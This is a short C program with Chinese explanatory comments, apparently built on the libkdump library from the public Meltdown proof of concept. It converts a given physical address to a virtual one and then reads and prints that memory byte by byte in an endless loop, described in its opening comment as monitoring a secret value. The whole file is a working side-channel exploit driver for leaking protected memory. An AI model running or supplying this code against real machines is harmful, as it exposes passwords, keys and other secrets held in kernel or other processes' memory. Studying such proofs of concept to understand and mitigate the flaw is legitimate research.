//改良代码，实现时监听秘密值
#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
  size_t phys;//物理地址
  if (argc < 2) { //只输入一个参数
    printf("Usage: %s <physical address> [<direct physical map>]\n", argv[0]);
    return 0;
  }
  /**
   * 参数1待转换的字符串指针；
   * 参数2表示存储转换后未被处理部分的指针；
   * 参数3表示字符串所采用的进制数。并根据字符串前缀进行转换
  */
  phys = strtoull(argv[1], NULL, 0);//获取物理地址
  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  
  if (argc > 2) { //输入两个参数 物理地址 | 基物理地址
    config.physical_offset = strtoull(argv[2], NULL, 0);//将字符串转换为无符号长整型数（ull）
  }

  libkdump_init(config);
  size_t vaddr = libkdump_phys_to_virt(phys);
/**
 * \x1b是ANSI转义序列的起始符号。
 * [32;1m设置输出颜色为亮绿色。
 * [0m是ANSI转义序列的结束符号，用于取消之前的颜色设置。
 * %zx是一个格式化字符串，用于将phys变量的值输出为十六进制数。
*/
  printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
  printf("\x1b[32;1m[+]\x1b[0m Physical offset        : \x1b[33;1m0x%zx\x1b[0m\n", config.physical_offset);
  printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);
  while (1) {//一直读取指定虚拟地址的字符
    int value = libkdump_read(vaddr);
    printf("%c", value);
    fflush(stdout);//让输出缓冲区立马输出
    vaddr++;//虚拟地址继续向后读
  }

  libkdump_cleanup();

  return 0;
}
